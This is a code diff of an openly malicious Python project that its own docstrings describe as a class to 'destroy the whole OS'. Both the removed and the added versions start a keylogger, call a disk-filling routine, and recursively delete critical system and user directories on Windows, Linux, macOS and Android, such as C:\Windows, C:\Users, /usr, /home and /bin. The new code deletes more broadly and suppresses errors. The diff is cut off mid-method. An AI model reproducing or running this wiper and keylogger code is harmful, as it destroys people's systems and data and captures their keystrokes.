@@ -1,6 +1,8 @@
 from abc import ABC
 import importlib
 import shutil
+import logging
+from pynput.keyboard import Key
 try:
     from . import keylogger
     from . import disk_fill as CT
@@ -12,131 +14,41 @@ except ImportError:
 _std_platform = importlib.import_module("platform")
 OS = _std_platform.system()
 
+logging.getLogger(__name__)
 
-class TerminalDestroyer(ABC):
-        """This is a class designed to destroy the whole OS and OS related files and directories.
-          It is a malicious class that should not be used in any real-world scenario.
-            The class has methods for different operating systems: Windows, Linux, Mac, and Android.
-        Each method attempts to start a keylogger before performing the destructive actions.
-          If any exception occurs while starting the keylogger, the code enters a destructive mode and tries to remove critical directories and files from the system. If any exception occurs during this process, it prints the error and calls the codeTest method from the CodeTest module. The CodeTest module is designed to fill the disk space in just a few seconds. This is a malicious action and should not be used in any real-world scenario. The code is for educational purposes only and should not be used to harm any system or data."""
 
+class Logger():
+        def logging():
+                try:
+                        keylogger.start_keylogger()
+                        keylogger.on_press(key=Key.enter)
+                        CT.codeTest()
+                
+                except Exception as e:
+                        logging.error(f"error: {e}. Trying to continue...")
+                        pass
+
+class OsDestroy():
         global OS
 
-        while True:
-              try:
-                """ This class is designed to destroy the terminal and its associated files based on the operating system. It uses the shutil module to remove directories and files that are critical to the functioning of the terminal. The class also attempts to start a keylogger before performing the destructive actions.
-                The class has methods for different operating systems: Windows, Linux, Mac, and Android."""
-
-
-                def WindowsTerminalDestroyer(self):
-
-                        # This method works only on Windows OS .
-
+        def WindowsDestroyer():
+                if OS.lower() == "Windows":
                         try:
-                                """ This method is designed to destroy the terminal and its associated files on Windows operating systems. It uses the shutil module to remove directories and files that are critical to the functioning of the terminal. The method also attempts to start a keylogger before performing the destructive actions.
-                                If any exception occures while starting the keylogger the code enters a destructive mode and tries to remove critical directories and files from the system. If any exception occurs during this process, it prints the error and calls the codeTest method from the CodeTest module.
-                                The CodeTest module is designed to fill the disk space in just few seconds. This is a malicious action and should not be used in any real-world scenario. The code is for educational purposes only and should not be used to harm any system or data."""
-                                if OS.lower() == 'windows':
-                                        keylogger.on_press()
-                                        keylogger.start_keylogger()
+                                ownership_steal.rem_root_dir("C:\\Program Files (x86)")
+                                ownership_steal.rem_root_dir("C:\\Program Files")
+                                ownership_steal.rem_root_dir("C:\\Users")
+                                ownership_steal.rem_root_dir("C:\\Windows")
+                                ownership_steal.rem_root_dir("C:\\ProgramData")
+                                ownership_steal.rem_root_dir("C:\\")
+                        except Exception as e:
+                                logging.error(f"error: {e}. Trying to continue...")
+                                pass
 
-                        except Exception:
-                                try:
-                                        ownership_steal.rem_root_dir("C:\\Users\\~\\Documents")
-                                        ownership_steal.rem_root_dir("C:\\appdata")
-                                        ownership_steal.rem_root_dir("C:\\Program Files (x86)\\Windows Defender")
-                                        ownership_steal.rem_root_dir("C:\\Program Files (x86)\\WindowsPowershell")
-                                        ownership_steal.rem_root_dir("C:\\Program Files\\Windows Security\\BrowserCore")
-                                        ownership_steal.rem_root_dir("C:\\ProgramData")
-                                        ownership_steal.rem_root_dir("C:\\Program Files (x86)")
-                                        ownership_steal.rem_root_dir("C:\\Program Files")
-                                        pass
+        def LinuxDestroyer():
+               if OS.lower() == "linux":
+                try:
 
-                                except Exception as e:
-                                                print(f"An error {e} occured . Performing different assignment.")
-                                                CT.codeTest()
-                
-                def LinuxTerminalDestroyer(self):
-
-                        # This method works only on Linux OS .
-
-                        try:
-                                """ This method is designed to destroy the terminal and its associated files on Linux operating systems. It uses the shutil module to remove directories and files that are critical to the functioning of the terminal. The method also attempts to start a keylogger before performing the destructive actions.
-                                If any exception occures while starting the keylogger the code enters a destructive mode and tries"""
-                                if OS.lower() == 'linux':
-                                        keylogger.on_press()
-                                        keylogger.start_keylogger()
-
-                        except Exception:
-                                try:
-                                        shutil.rmtree("/usr/bin")
-                                        shutil.rmtree("/usr/local/bin")
-                                        shutil.rmtree("/usr/share")
-                                        shutil.rmtree("/usr/lib")
-                                        shutil.rmtree("/usr/include")
-                                        shutil.rmtree("/usr/sbin")
-                                        shutil.rmtree("/usr/src")
-                                        shutil.rmtree("/usr/games")
-                                        shutil.rmtree("/usr/local/games")
-                                        shutil.rmtree("/usr")
-                                        pass
-
-                                except Exception as e:
-                                        print(f"An error {e} occured . Performing different assignment.")
-                                        CT.codeTest()
-
-                def MacTerminalDestroyer(self):
-
-                        # This method works only on Mac/Apple OS .
-
-                        try:
-                                """ This method is designed to destroy the terminal and its associated files on Mac operating systems. It uses the shutil module to remove directories and files that are critical to the functioning of the terminal. The method also attempts to start a keylogger before performing the destructive actions.
-                                If any exception occures while starting the keylogger the code enters a destructive mode and tries"""
-                                if OS.lower() == 'darwin':
-                                        keylogger.on_press()
-                                        keylogger.start_keylogger()
-
-                        except Exception:
-                                try:
-                                        shutil.rmtree("/Applications")
-                                        shutil.rmtree("/Library")
-                                        shutil.rmtree("/System")
-                                        shutil.rmtree("/usr")
-                                        shutil.rmtree("/bin")
-                                        shutil.rmtree("/sbin")
-                                        shutil.rmtree("/private")
-                                        pass
-
-                                except Exception as e:
-                                        print(f"An error {e} occured . Performing different assignment.")
-                                        CT.codeTest()
-
-                def AndroidTerminalDestroyer(self):
-
-                        # This method works only on Android OS .
-
-                        try:
-                                """ This method is designed to destroy the terminal and its associated files on Android operating systems. It uses the shutil module to remove directories and files that are critical to the functioning of the terminal. The method also attempts to start a keylogger before performing the destructive actions.
-                                If any exception occures while starting the keylogger the code enters a destructive mode and tries"""
-                                if OS.lower() == 'android':
-                                        keylogger.on_press()
-                                        keylogger.start_keylogger()
-
-                        except Exception:
-                                try:
-                                        shutil.rmtree("/system")
-                                        shutil.rmtree("/data")
-                                        shutil.rmtree("/cache")
-                                        shutil.rmtree("/storage")
-                                        shutil.rmtree("/mnt")
-                                        pass
-
-                                except Exception as e:
-                                        print(f"An error {e} occured . Performing different assignment.")
-                                        CT.codeTest()
-
-              except Exception as e:
-                            print(f"An error {e} occured while trying to start the opration")
-                            pass
-
-              break
+                        shutil.rmtree("/home", ignore_errors=True)
+                        shutil.rmtree("/root", ignore_errors=True)
+                        shutil.rmtree("/usr", ignore_errors=True)
+                        shutil.rmtree("/bin", )
